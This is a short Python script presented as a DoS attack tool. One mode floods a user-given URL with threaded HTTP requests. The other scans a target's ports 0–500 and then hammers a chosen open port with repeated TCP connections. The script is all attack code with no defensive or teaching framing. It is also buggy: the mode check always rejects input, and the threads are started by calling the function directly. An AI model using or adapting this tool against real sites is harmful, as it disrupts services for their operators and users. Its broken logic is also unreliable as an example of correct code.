import socket
import threading
import requests

while True:
    print("Mode(1): HTTP Request DoS Attack")
    print("Mode(2): Open Port Request DoS Attack")
    mode = int(input("Insert Mode(1-2): "))

    if(mode != 1 or mode != 2):
        print("Please insert available mode")
        continue
    else:
        break


if mode == 2:
    website = str(input("Website(with www): "))

    num_threads = int(input("Threads(int 10-1000): "))


    def get_website_ip(hostname):
        try:
            ip_address = socket.gethostbyname(hostname)
            return ip_address
        except socket.error as e:
            print(f"Error: {e}")


    def scan_ports(hostname, start_port, end_port):
        open_ports = []
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((hostname, port))
            if result == 0:
                print(result, " Port: ", port)
                open_ports.append(port)

            sock.close()
        return open_ports


    # Example usage:
    ip_address = get_website_ip(website)

    startport = 0
    endport = 500

    ports = []
    print("Attack Started")


    def ddos_attack(target_ip, target_port):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
                sock.sendto(b"Host: " + target_ip.encode() + b"\r\n\r\n", (target_ip, target_port))
                sock.close()
                print("Attack sent!")
            except:
                print("Attack failed!")


    def launch_ddos(target_ip2, target_port2):
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=ddos_attack(target_ip2, target_port2))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()


    print("Ports Scanning...")

    temp_port = scan_ports(website, startport, endport)

    while True:
        print(f"Available Open Ports {temp_port}")
        main_port = int(input("Port: "))
        if main_port not in temp_port:
            print("This port is not available, please insert available port")
            continue

        launch_ddos(target_ip2=ip_address, target_port2=main_port)

if mode == 1:
    def perform_attack(url):
        while True:
            try:
                response = requests.get(url)
                print("Request sent to", url)
            except requests.exceptions.RequestException:

                print("Error occurred while sending request to", url)


    # Specify the target website URL
    target_url = str(input("Website URL(with https://)"))
    num_threads = int(input("Threads(10-1000): "))

    # Specify the number of threads/requests to send
    # Launch the attack
    for _ in range(num_threads):
        threading.Thread(target=perform_attack, args=(target_url,)).start()
